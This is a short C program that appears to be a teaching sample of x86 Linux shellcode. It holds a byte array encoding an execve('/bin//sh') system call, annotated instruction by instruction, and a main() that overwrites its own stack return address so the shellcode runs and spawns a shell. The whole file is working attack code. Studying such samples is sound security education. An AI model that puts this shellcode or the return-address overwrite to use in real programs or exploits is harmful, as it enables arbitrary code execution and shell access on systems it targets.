char shellcode[] = "\x31\xc0"	// xor eax, eax
		   "\x50"	// push eax
		   "\x68\x2f\x2f\x73\x68"	// push "hs//"
		   "\x68\x2f\x62\x69\x6e"	// push "nib/"
		   "\x89\xe3"	// mov ebx, esp
		   "\x31\xc9"   // xor ecx, ecx
		   "\x31\xd2"	// xor edx, edx
		   "\x31\xf6"   // xor esi, esi
		   "\xb0\x0b"	// mov al, 0x0b
		   "\xcd\x80";	// int 0x80
int main()
{
	int* ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}
